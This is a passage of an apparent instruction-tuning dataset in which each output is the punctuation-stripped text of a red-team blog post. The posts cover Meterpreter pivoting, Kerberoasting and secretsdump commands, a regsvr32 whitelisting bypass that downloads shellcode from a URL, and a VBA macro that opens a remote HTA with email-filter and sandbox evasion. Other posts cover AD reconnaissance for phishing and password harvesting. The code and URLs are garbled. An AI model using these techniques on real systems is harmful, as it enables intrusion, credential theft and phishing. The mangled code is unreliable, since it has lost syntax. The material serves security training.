        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Use Nmap with Meterpreter</title>\n<taxonomies>Author, Brian Fehrman, External/Internal, Red Team, All the Shellz, Debian, metasploit, meterpreter, Nmap, Pentesting, proxychains, Ubuntu</taxonomies>\n<creation_date>Mon, 01 May 2017 15:41:35 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Brian Fehrman You've sent your phishing ruse the target has run the Meterpreter payload and you have shell on their system Now what If you follow our blogs you probably have quite a few ideas One thing that I don't typically do is port scan other systems on the network There are a few reasons for this Port scanning is quite noisy many IDS packages are set to quickly alert on these activities and most of the time it isn't needed to achieve my goals Regardless let's say that you do find yourself in a situation where you do need to find services on other systems Maybe you're on a segmented network you've gained shell on a jump host and now you want to explore the new world that has just opened up to you There are a few options out there that you can utilize Metasploit has a few built-in scanner modules that you can use after you've achieved a Meterpreter session on a system You just add a route in Metasploit to tunnel traffic through your session provide the scanning module with the addresses that you'd like to scan kick off the scanner and then wait for the results In my experience I've had varying mileage when using this Sometimes the feedback can be a bit lacking and the results aren't always consistent This could very well just be user error Even with that in mind I prefer to have a bit more flexibility than what the modules provide Wouldn't it be great if we could use something like Nmap to do our scanning Well guess what We can We'll utilize a combination of tools and features to get this quickly up and running 1 The first step is to get a Meterpreter session on a system Once you've done that add a route to tunnel traffic that is destined for your target subnet through your session Next hop into the auxiliary server socks4a Metasploit module set your srvport to 1090 and run the module You could choose a different port this is just the one that I chose to use This will set up a SOCKS proxy-listener on your local system The SOCKS proxy will be aware of the routes that you've added in Metasploit Any traffic going through this proxy that has a destination address that is within the subnet route s that you've added will automatically be routed through the corresponding Meterpreter session Open another terminal on the same machine that you're using to run Metasploit and install the proxychains package if you don't already have it For instance on Ubuntu or Debian apt-get install proxychains Now use your favorite editor to open up the etc proxychains.conf file Head to the bottom of the file and edit the last line to look like the image below Head back to your terminal and you're ready to start scanning I've found that the Syn scan and Ping Discovery options in Nmap don't seem to work the best via proxychains I suggest running Nmap with the -sT and -Pn options when using the proxychains method The image below shows how to kick off a scan against a subnet on the target network that checks for some commonly-used ports outputs the status to the screen and saves the results in multiple formats that can easily be parsed later 1 en-testing.sans.org blog 2012 04 26 got-meterpreter-pivot Follow Brian on Twitter fullmetalcache"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>A Toast to Kerberoast</title>\n<taxonomies>Author, Derek Banks, External/Internal, Red Team, kerberoasting, Kerberos</taxonomies>\n<creation_date>Mon, 08 May 2017 16:55:33 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Derek Banks This post will walk through a technique to remotely run a Kerberoast attack over an established Meterpreter session to an Internet-based Ubuntu 16.04 C2 server and crack the ticket offline using Hashcat Recently I have had a lot of success with privilege escalation in an Active Directory domain environment using an attack called Kerberoasting Tim Medin presented this technique at SANS Hackfest 2014 and since then there have been numerous awesome articles and conference talks on the details of the attack and tools written for different techniques to pull it off reference links at the bottom of the post The Microsoft implementation of Kerberos can be a bit complicated but the gist of the attack is that it takes advantage of legacy Active Directory support for older Windows clients and the type of encryption used and the key material used to encrypt and sign Kerberos tickets Essentially when a domain account is configured to run a service in the environment such as MS SQL a Service Principal Name SPN is used in the domain to associate the service with a login account When a user wishes to use the specific resource they receive a Kerberos ticket signed with NTLM hash of the account that is running the service This is a bit of an oversimplification of the details of the process for sure but the end result is that any valid domain user can request an SPN for a registered service mostly I have seen SQL and IIS and the Kerberos ticket received can be taken offline and cracked This is significant because generally a service account is at the very least going to be an administrator on the server where it runs So how do we pull this off Assuming that Metasploit is installed on the C2 server already we need to get the Impacket project from Core Impact This is a collection of Python classes for working with network protocols If Metasploit is not installed the PTF framework from TrustedSec makes it easy on Ubuntu 16.04 git clone ithub.com CoreSecurity impacket Next we need to install and configure proxychains After install the only configuration change is the desired port for example 8080 apt-get install proxychains Now we need an established meterpeter session There are many ways to go about this in a pen test and different methods can be situationally dependent so we will assume an established session is active Next we set a route in Metasploit to cover the internal subnet that contains the IP address of a Domain Controller We now need a method to route externally to Metasploit tools through the meterpreter connection For this Metasploit has a module named socks4a that uses the built-in routing to relay connections Set the SRVPORT option to the same port value used with configuring proxychains I am a generally a paranoid person and since the socks proxy port is now an open socket that routes through to an internal network I suggest using IP tables to limit connections to 8080 to the localhost Some proponents of hacking naked may think this is overkill but sometimes I think wearing around a firewall is appropriate this is one of those times The IP tables rules file I use is here Place the IP tables rules file in etc iptables.rules and run sbin iptables-restore etc iptables.rules Now we are all set to use one of the Impacket example scripts and a valid and unprivileged domain account to gather Kerberos tickets advertised via SPN using proxychains over the meterpreter session proxychains GetUserSPNs.py -request -dc-ip 192.168.2.160 lab.local zuul Any Kerberos tickets gathered by the GetUserSPNs script directly crackable with Hashcat without any additional conversion the hash type was added in version 3.0 On my Windows desktop with a single Radeon R280 the password for the service account was cracked in three minutes using the Crackstation word list hashcat -m 13100 -a 0 sqladmin_kerberos.txt crackstation.txt To take it one step further the same method of proxying tools over meterpreter can be used to dump out domain account hashes from the domain controller using another example Impacket script named secretsdump.py once domain administrator rights have been obtained In this example in my lab I had the SQL admin service account with a weak password also a member of the Domain Admins group You may think this is a bit contrived but it is not In the last few months especially in older Active Directory environments that have grown organically over the years I have directly obtained a domain administrator account using Kerberoasting and cracking a Domain Admins group member password I have subsequently elevated to domain administrator from further pivoting on numerous occasions proxychains secretsdump.py -just-dc-ntlm LAB sqladmin 192.168.2.160 The fix for this at the moment is to make sure that all service accounts in your environment have really long passwords How long depends on what resources you think your potential attacker has access to for cracking passwords My current suggestion based on potential password cracking tool limitations is 28 characters or longer with a 6-month rotation Thank you to everyone who has put a lot of time research and effort into attacking Kerberos As always I stand on the shoulders of giants If I left any references out it was not on purpose please let us know if any other relevant links should be included dsecurity.org ?p 2293 ww.sans.org cyber-security-summit archives file summit-archive-1493862736.pdf oom362.com post 2016 kerberoast-pt1 ww.harmj0y.net blog powershell kerberoasting-without-mimikatz ithub.com nidem kerberoast sdn.microsoft.com en-us library ms677949 v vs.85 .aspx"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Evade Application Whitelisting Using REGSVR32</title>\n<taxonomies>Author, External/Internal, Joff Thyer, Red Team, Red Team Tools, Casey Smith, COM+ scriplets, DLL, subtee, Wevade, whitelisting</taxonomies>\n<creation_date>Wed, 10 May 2017 14:11:03 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Joff Thyer I was recently working on a Red Team for a customer that was very much up to date with their defenses This customer had tight egress controls perimeter proxying strong instrumentation and very tight application whitelisting controls My teammate and I knew that we would have to work very hard to get command and control outbound from this environment and that would be after obtaining physical access yet another significant challenge The week before going on-site we began to research all of the various methods for potential application whitelisting bypass We assumed the best case defensive scenario whereby the customer would have all binary execution blocked with the exception of specific applications permitted In prior tests with other customers and this same customer we had used rundll32.exe to execute DLL content This method is really useful if you can host shellcode within a DLL and have a nice controlled entry point In the Metasploit case the DLL entry point is named Control_RunDLL While this might evade whitelisting we also knew this old trick had been played before and we likely could not count on it again One interesting technique published by Casey Smith involves the DLL registration process within Windows and shows how COM scriptlets can be executed by reading the scriptlet as an argument to regsvr32.exe and using the COM scrobj.dll Additionally Casey published an outline of how to launch processes using a custom DLL written in C as further detailed in this source code I was enamored by both these techniques although I didn't want to write COM scriptlets to launch payloads but rather wanted greater flexibility My goals were to try and get regsvr32.exe to register a DLL which could execute either shellcode or a PowerShell script pipeline directly during the DLL registration process What is very nice about the regsvr32.exe DLL registration method is that whatever DLL you create only has to export four different methods in order to work These are EntryPoint DllRegisterServer DllUnRegisterServer DllInstall As Casey points out in various blog entries this affords you with multiple paths of code execution all using a Windows binary that is likely to be whitelisted in any environment Wait but what is this regsvr32.exe entity According to Microsoft This command-line tool registers .dll files as command components in the registry You can read more from TechNet here echnet.microsoft.com en-us library bb490985.aspx I decided to leverage the DllInstall routine with the following logic Pass the string shellcode or powershell using the i flag when running regsvr32.exe Pass in a comma followed by either a filename or URL pointing to data that is base64 encoded The base64 encoded data is either binary shellcode or a PowerShell script Read the file or URL contents then base64 decode If the content is PowerShell create a runspace pipeline and execute the script If the content is Shellcode allocate memory and execute the shellcode A code snippet to perform these functions appears below as written in C The idea is to compile this into a DLL which then can be used with regsvr32.exe Copying ShellCode into Memory and Creating New Thread Creation of a System Automation Runspace for PowerShell Script Execution Now you ask how do you pass the filename or URL into the DLL when using regsvr32.exe It turns out that the i flag allows us to specify parameters on the command line which we can then parse to get the information we need Once we parse this information we can then use the NET WebClient methods to either download or just read from the file the content we are interested in DllInstall Method Exported Filename and URL Parsing and Decision Logic Putting it all together we can then compile both a 64-bit and 32-bit version of our DLL and then use the DLL to deliver either PowerShell or Shellcode payloads If our compiled DLL's are called rs32.dll and rs64.dll this is how you might use the end tool 1 On Linux system generate your payload msfvenom -p windows x64 exec CMD calc.exe -f raw 2 dev null base64 calc.b64 2 Download the payload to Windows as well as the rs64.dll assuming 64-bit C regsvr32.exe s i shellcode calc.b64 rs64.dll But WAIT it gets even better now Why bother downloading the payload when you can just use HTTP s from the fancy DLL directly C regsvr32.exe s i shellcode 0.10.10.10 calc.b64 rs64.dll Now we can do the same thing only this time using PowerShell instead Generate your favorite PowerShell base64 encoded payload Let me guess you probably want to use PowerShell Empire ww.powershellempire.com which conveniently includes a base64 script as the client-side agent 1 Generate your PowerShell empire script using the launcher stager 2 Now cut paste only the base64 encoded portion and save it in a file 3 Execute the powershell using regsvr32.exe and your fancy custom DLL C regsvr32.exe s i powershell payload.b64 rs64.dll Or alternatively C regsvr32.exe s i powershell 0.10.10.10 payload.b64 rs64.dll And there you have it a brand new method of payload delivery that will happily bypass most environments that have implemented application whitelisting If you want to try out the code please visit the bitbucket repo itbucket.org jsthyer wevade The wevade name is a random brain pick combination of whitelisting and evade Yeah I know I don't claim to be a marketing guru by any stretch Thanks and please enjoy"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Domain Goodness - How I Learned to LOVE AD Explorer</title>\n<taxonomies>Author, External/Internal, Red Team, Red Team Tools, Sally Vandeven, AD Explorer, DA, domain admin, Pentesting, Shodan</taxonomies>\n<creation_date>Mon, 15 May 2017 16:18:57 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Sally Vandeven OR How to Pentest with AD Explorer Mark Russinovich's Sysinternals tools Microsoft are nothing new They have been a favorite among system administrators for many many years Maybe a little less known is that they are super helpful for pentesters too One of my favorites is AD Explorer My colleague Dave Fletcher who has worn many hats including that of sysadmin extraordinaire reminded me of this tool on an engagement and I have been using it on internal assessments faithfully ever since Of course for organizations that expose domain controllers on the Internet this could be useful on external tests as well read on for more about that using Shodan All you need is a domain account any domain account and you can talk to a domain controller and ask it to enumerate the domain for you It will layout the OU structure the user accounts computer accounts It may offer some help on finding juicy targets like privileged users and database servers Like all the Sysinternals tools they are standalone executables no installation required So as long as you have write access somewhere you can download it from ive.sysinternals.com But what if you don't have write access or are not allowed to download executables No worries you can also give it the following UNC path directly from the Run box or an Explorer window and execute it without downloading the file to disk live.sysinternals.com tools ADExplorer.exe Click on an executable to load it directly into memory from Microsoft's site Let's look at a couple of examples of how awesome this tool is First you might find metadata giving you clues about an object like in the screenshot below It looks like we found the CIO's laptop I don't know about you but if I learn the machine name of the CIO's computer I can't resist finding a way to login there and grab their credentials from memory That would typically be a pretty privileged account as well There may be other attributes with interesting information as well such as the info attribute In the example below we show an AD record from a real test The data is redacted but suffice it to say the data there is quite sensitive and presents some excellent social engineering opportunities think password reset If you need to find high-value target servers then more often than not the organization's naming convention will help you with that Servers are very frequently named according to their function eg with SQL or Sharepoint in the name The search feature in AD Explorer is also excellent and helps you slice and dice through the mountains of data to find just what you need For example do you need to identify the disabled accounts Just select the userAccountControl attribute and search for values of 514 Actually the userAccountControl attribute is a value representing multiple flags one of which is the disabled flag so there could be multiple values here that represent disabled accounts but the most common would be 514 If you have high enough privileges you can also add and modify objects and attributes It doesn't let you do as much as Active Directory Users and Computers but this feature still could be useful on a pentest As a demo I added the Comment attribute for user Grace in my test domain The tool also gives you the wonderful option of saving a snapshot ...that you can copy off anywhere and open it back up in AD Explorer for your viewing pleasure Viewing a snapshot won't let you make any changes but it is excellent for reconnaissance activities AD Explorer can also do a diff of two snapshots How might this be useful on a pentest Take a snapshot right away when you get access to the domain Then after you have done some hacking and cracking and people start changing their passwords or disabling accounts you can take another snapshot and see who has changed their passwords or which are disabled As far as I can tell AD Explorer does not allow you to modify passwords or change the status from disabled to enabled even as DA but at least you can check and avoid disabled accounts to stay a bit stealthier using this method Now about the external testing ..What if you do a Shodan search for DCs that are exposed on the Internet and log on to one that way Of course you'll need to come up with a domain account if you want to connect to the server using AD Explorer The search below is for two common LDAP ports and a hostname that contains the letters DC There are plenty out there accessible from the Internet surprisingly enough Or take it a step further and add in port 445 to find Domain Controllers that may be vulnerable to some of the freshly leaked SMB exploits from Shadow Brokers Note Not all these hits have all three ports open A compromise of one of these servers could represent the compromise of an entire domain Yikes Make sure your organization is not on this list !!New Tips and Tricks Added May 2018 Use AD Explorer to Assist with Phishing Ruses If you want to send targeted phishing emails to a particular group from an external email address you can query AD for distribution groups that allow mail from external sources The attribute msExchRequireAuthToSendTo reveals this When that attribute is False anyone can send mail to the group You can also double-click a group from the search results and then examine the member attribute of the group to get a list of the members Individual email addresses can be extracted that way but it is much more tedious The ability to send to a group is much quicker and it just might make the email a bit more believable to the recipients Create a Snapshot from the Command Line AD Explorer is a GUI tool but as you know GUI access is often not available But from shell access you can create a snapshot too Thanks Fletch Upload the executable to the host you have shell access on and use the following command adexplorer.exe -snapshot mysnap.dat Or run it without uploading first with this command live.sysinternals.com tools adexplorer.exe -snapshot snap.dat You can see the required syntax by typing adexplorer from the command prompt Hunting for Privileged Accounts Also if you are hunting for privileged accounts to don't forget to check the Builtin Administrators group This may contain accounts that are not necessarily Domain Admins but might have local admin access to domain controllers FTW Hunting for Passwords There are 3-4 fields that seem to be common in most AD schemas UserPassword UnixUserPassword unicodePwd and msSFU30Password On a surprising number of tests we find one or more of these fields are populated with ACTUAL passwords They are sometimes obfuscated by converting to the ASCII decimal equivalents but that is nothing that man ascii can't help you with Here is an example from a recent snapshot we took These both have the same password which decodes to A B C D e f g h 1 2 3 4 5 6 7 8 9 0 If you know of any other tips or tricks using AD Explorer please let us know and will add them on Thanks"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Get Malicious Macros Past Email Filters</title>\n<taxonomies>Phishing, Red Team, Red Team Tools, macros, MS Excel, MS Office, MS Word, Risky Business</taxonomies>\n<creation_date>Mon, 05 Jun 2017 18:41:58 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts A malicious macro in a Microsoft Word or Excel document is an effective hacking technique These documents could be delivered in a variety of ways including through an email or uploaded as a resume to a job site For this reason anti-malware solutions such as inbound email filters attempt to block delivery of malicious macros In my experience the following techniques prove useful in bypassing these protections First a standard little trick taught to me by Ethan Robish ethanrobish is to save the macro-enabled document in the older Word 97-2003 Document format More recent versions of MS Office require the docm extension for macro-enabled documents but the older format allows for a less obvious doc extension Save Macro-Enabled Document as Word 97 .doc File While this won't be enough to get you by many of the filters it is a good first step Brian Fehrman fullmetalcache has posted some tricks in the past on the same subject of bypassing mail filters but this hasn't been working for me as of late It appears that the inbound filters are disliking the methods used by PowerShell Empire Metasploit and even TrustedSec's Unicorn payload generator to invoke the command shell from a macro As an alternative I found the following macro to successfully bypass inbound email filters This macro reads a HTA file from a remote webDav server Sub AutoOpen Debugging End Sub Sub Document_Open Debugging End Sub Public Function Debugging As Variant Set shellApp CreateObject Shell.Application shellApp.Open your.webdavserver.net webdav updater.hta End Function This code uses the Shell.Application Open method which is less scrutinized by inbound email filters than a direct attempt to invoke a command on the command line To use the macro replace the your.webdavserver.net text with the domain or IP address of your webDav server where you are hosting the HTA file Depending on the target environment using a domain name may be effective while using an IP address is not or vice-versa Try both For information on setting up a webDav server see this blog post The HTA file itself can be generated with a number of tools An example using PowerShell Empire is given below Save the output to a file with an hta extension Generating HTA Payload with PowerShell In the event that the target has little to no internet connectivity with which to download the HTA file you may have to write the HTA file to the disk on the target However some email filters run the macro payload in a sandbox environment and do not like it when a macro both writes a file to disk and subsequently reads it You can usually get away with one or the other in the macro but not both If you have direct access to the target test this out by manually creating your payload on the target system and then emailing a macro to simply execute the existing payload Your macro will likely make it through the inbound email filters This brings up some interesting ideas about having a macro which executes a file if it already exists on disk otherwise it creates it and exits This would require the macro to be run twice by the victim This is not completely infeasible If you have the macro show an error and close the document the victim is likely to try to open it again This leads us to more creative ideas what if the macro checked the time of day and would only execute the malicious payload after a certain day and time The time could be set for ten minutes after the email is sent The macro in this case would not exhibit malicious behavior when executed in the sandbox but would behave differently later For the record I tried this and failed recently but it is good food for thought and may be effective against other anti-malware solutions My final working solution in this case where internet connectivity was restricted was to write the file to a specific location that existed on my target but not in the sandbox environment For example c Users croberts Since this location does not exist in the sandbox environment it does not get written to disk nor subsequently executed However on the target system it works like a charm The final macro is shown below Sub AutoOpen Bhistest End Sub Sub Document_Open Bhistest End Sub Public Function Bhistest As Variant Dim Str As String Dim Str2 As String Str Set objFSO CreateObject Scripting.FileSystemObject Set objFile objFSO.CreateTextFile c users croberts final.hta True objFile.Write Str vbCrLf objFile.Write Str2 objFile.Close Set shellApp CreateObject Shell.Application shellApp.Open c users croberts final.hta End Function Remote code execution through an email phish has been demonstrated even under some of the most restrictive environments Defenders do you REALLY need to allow macro enabled document delivery from external sources It's risky business"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Identify Network Vulnerabilities with NetworkRecon.ps1</title>\n<taxonomies>Author, David Fletcher, External/Internal, Red Team, Red Team Tools, network traffic, Network Vulnerabilities, NetworkRecon.ps1, tools</taxonomies>\n<creation_date>Thu, 08 Jun 2017 15:02:19 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "David Fletcher Whenever I have the opportunity I like to perform packet collection on a test for about five minutes so I can analyze the results and look for network-based opportunities to attack However on many engagements I find that I don't have the opportunity inspect network traffic This is because I either don't want to install third-party software doing so is prevented by a technical control or that doing so is out of scope on the test In this post I present NetworkRecon.ps1 a script that allows you to perform quick analysis to identify potentially vulnerable protocols visible by Windows client systems Initially I attempted to build a tool that would collect and analyze traffic presenting output similar to that produced by PowerUp.ps1 Invoke-AllChecks as seen below PowerUp is used to provide very concise feedback indicating where an operating system's configuration might allow privilege escalation The intent for this script was to do the same for network protocol abuse In investigating the available options I found that working with the facilities for packet capture and analysis using PowerShell particularly Windows 7 and older operating systems were not optimal for creating this output in all cases Fortunately I was already familiar with Invoke-Inveigh written by Kevin Robertson and included in several other exploitation frameworks After running into issues with the collect and analyze workflow I adopted the packet sniffing capabilities observed in this and other tools as an alternative The script includes three functions Invoke-NeighborAnalysis Invoke-TraceCollect and Invoke-LiveAnalysis These functions provide different detective capabilities to identify CDP DTP VTP LLDP mDNS NBNS LLMNR HSRP OSPF and VRRP protocols which may be used for information gathering or indicate vulnerability to attack In addition the script analyzes DHCP responses looking for options that indicate network boot is supported Invoke-NeighborCacheAnalysis Invoke-NeighborAnalysis attempts to detect the presence of the protocols listed above at layer 2 of the OSI model This function uses the output from either arp -a or Get-NetNeighbor based on the supported PowerShell version The output is analyzed looking for corresponding multicast layer 2 and layer 3 addresses indicating that a protocol is likely in use and visible from the end host The packet sniffer uses a raw socket and doesn't collect Ethernet frames As a result this is the only way that CDP DTP VTP and LLDP can be detected at present I did some research on collecting Ethernet frames using PowerShell but came up empty handed Output from Invoke-NeighborCacheAnalysis can be seen below Invoke-TraceCollect Invoke-TraceCollect does exactly what it sounds like It simply records network traffic in a trace file for a user specified period default is 5 minutes so the user can move the traffic off and analyze it with another tool This function will output either a .cap file or a .etl file depending on the operating system features Windows 8.1 and newer supports the Protocol Engineering Framework PEF PowerShell commandlets by default This framework allows one to directly save a network trace in packet capture format Older versions of Windows support the Event Trace Log ETL format which records packets in an XML and binary format ETL format can be converted to packet capture as well However Microsoft Message Analyzer an additional Microsoft software package is used to do so The output from this function simply indicates which format is being used and where the trace file is being written To run this function you must have administrator permissions on the target computer Invoke-LiveAnalysis Invoke-LiveAnalysis uses a raw IP socket to pick traffic up off of the wire and perform analysis This method uses the layer 3 multicast addresses and well known ports to identify the presence of protocols of interest The user is notified when mDNS NBNS LLMNR HSRP OSPF or VRRP packets are observed Notifications include details parsed from observed traffic such as authentication method passwords or hashes used and hostnames for which queries are observed Output from several of the protocols above can be seen in the screen captures below The protocols listed above were selected due to the presence of attacks and tools available for each Protocols and their related vulnerabilities are identified below CDP and LLDP may expose information valuable to an attacker such as Layer 2 device names and firmware revisions DTP and VTP may allow an attacker to access protected areas of the network through VLAN hopping attacks mDNS NBNS and LLMNR may allow an attacker to send poisoned responses to multicast name resolution request These attacks executed by tools like Invoke-Inveigh and Responder can result in credential compromise or direct exploitation by directing requesting hosts to an attacker controlled computer HSRP and VRRP may allow an attacker to become a Man-in-the-Middle MitM by electing an attacking computer as the active router in a redundant configuration OSPF may allow an attacker to become a MitM by manipulating the OSPF routing table Discovery of DHCP boot options may allow an attacker to boot an authorized operating system or download and analyze the boot image for valid credentials The end goal for this tool is to include intelligence gathering and attack capabilities for all of the Layer 3 protocols identified above Further investigation into Layer 2 protocols will continue to determine whether Layer 2 attacks will be possible using the native PowerShell interface You can find the full script at itbucket.org Super68 networkrecon and an expanded explanation of each of the functions at ww.sans.org reading-room whitepapers access identifying-vulnerable-network-protocols-powershell-37722 Please provide feedback and let us know how this tool works in practice"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Towards a Quieter Firefox</title>\n<taxonomies>Author, Brian King, General InfoSec Tips & Tricks, InfoSec 201, Firefox, Firefox extentions, HTTP, penetreation testing, Pentesting, quieter Firefox, tool, webapp test</taxonomies>\n<creation_date>Mon, 12 Jun 2017 14:24:06 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Brian King On a recent webapp test I got a little frustrated with all the extra HTTP requests showing up in my Burpsuite Proxy History from connections that Firefox was making on its own I was having to scroll around way more than I used to while trying to make sense of the traffic The last straw was this detectportal thing that seemed to be showing up every 60 seconds I found some other Firefox users complaining about the same things and I followed those steps but they didn't cover everything I'm going to show you what I learned about keeping Firefox quieter and I'll give you a file you can use yourself to take care of all this stuff automatically when you set up a new installation I set up a fresh install of Firefox version 53.0 with no plugins or add-ons and told it to connect through Burp Suite I added the Burp CA certificate so Firefox wouldn't complain about the certificates Burp would generate and so I could still connect to the sites using HSTS After ten minutes of just letting the browser sit there I'd captured 52 HTTP requests to 12 unique domains Ten Minutes No User Action Twelve Domains Ten Minutes 52 Requests The first and last request was the one that got my attention and started me down this road By default Firefox sends an HTTP GET to etectportal.firefox.com success.txt every 60 seconds And the response is just the word success what's it doing According to ugzilla.mozilla.org show_bug.cgi?id 1307867 this is a way for Firefox to detect if it's running behind a captive portal A captive portal is that sign-in page you get at hotels and airports when you try to browse the Internet where you have to log in or agree to terms or some such There's an advanced setting that can disable this but nothing exposed in the UI In the address bar type about config then click through the warning Search for network.captive-portal-service.enabled and click it to toggle to false and it'll stop sending this request That takes care of this one case but while we're at it let's see how far we can go The Firefox project has a list to help you out under the heading How to stop Firefox from making automatic connections upport.mozilla.org en-US kb how-stop-firefox-making-automatic-connections That article is a little old and some things are not where they were when it was written so let's start with the UI as it is in version 53.0 of Firefox which is the current version as of this writing Before we begin you need to know that the button at the top right of the browser window just below the title bar with three horizontal lines across it is called the hamburger menu by the same people who want you to believe that the floppy disk icon is an unrecognizable symbol for the save function When I say hamburger below that's what I'm talking about Hamburger Options General When Firefox Starts Show a blank page Search uncheck provide search suggestions for whichever search engine you choose Content no changes Applications no changes Privacy uncheck Use Tracking Protection in Private Windows because this feature requires Firefox to keep its list of tracking methods updated Security uncheck Block dangerous and deceptive content because Firefox has to keep its list of these things updated too Security uncheck Block dangerous downloads Security uncheck Warn you about unwanted and uncommon software Sync Don't sign into a Firefox account here Advanced General no changes Advanced Data Choices uncheck everything on this pane Advanced Network no changes Advanced Update check Never check for updates Advanced Update uncheck Use a background service to install updates and automatically update search engines Certificates no changes Hamburger Add-ons Gear Menu at the top uncheck Update Add-ons Automatically With the captive portal Preference set to false and those UI-accessible changes made close Firefox and restart it It's better but there are still some connections happening at startup These are far less problematic than the captive portal thing but in the interest of making Firefox as quiet as possible let's figure out how to make these stop too Go to about config and search for the string self-repair.mozilla.org and you'll find this That's the same hostname but not the same URL This turns out to be related to the Heartbeat user-survey function as explained at iki.mozilla.org Advocacy heartbeat and doesn't actually repair anything Delete the value for this preference double-click the row then just blank out the value Then restart Firefox again You should notice that those three requests don't happen anymore It's actually pretty quiet I let the browser sit open again for ten minutes on the default blank tab and there were no HTTP requests from Firefox this time There are still some connections that will happen automatically during a browsing session just less often If you want to catch these too go to about config and set all of the items below to false extensions.blocklist.enabled network.prefetch-next extensions.getAddons.cache.enabled browser.casting.enabled And set this to true network.dns.disablePrefetch And set this to zero Network.http.speculative-parallel-limit And set this to the empty string browser.aboutHomeSnippets.updateUrl And set these to the word ignore browser.startup.homepage_override.mstone There Now Firefox shouldn't be polluting your Burp Proxy History with requests you didn't make I put this all into a user.js file which you can copy to the Firefox profile directory every time you set up a new testing VM so you don't have to remember and make all those changes by hand Remember the only point here is to make Firefox quiet This isn't a security thing and would actually be a pretty bad idea to install on the Firefox you use for daily browsing Get a copy of the file here itbucket.org mrbbking quieter-firefox and if you have ideas for improvement the repo is there as well"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Build a Password Cracker with NVidia GTX 1080TI & GTX 1070</title>\n<taxonomies>Author, Kent Ickler, Red Team, Red Team Tools, Build, Hash, Hashcat, Hashcat Benchmarks, Kent Ickler, Nvidia GTX 1070, password, Password Cracker, Password cracking, Summer2017, The Kraken</taxonomies>\n<creation_date>Tue, 20 Jun 2017 15:17:15 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
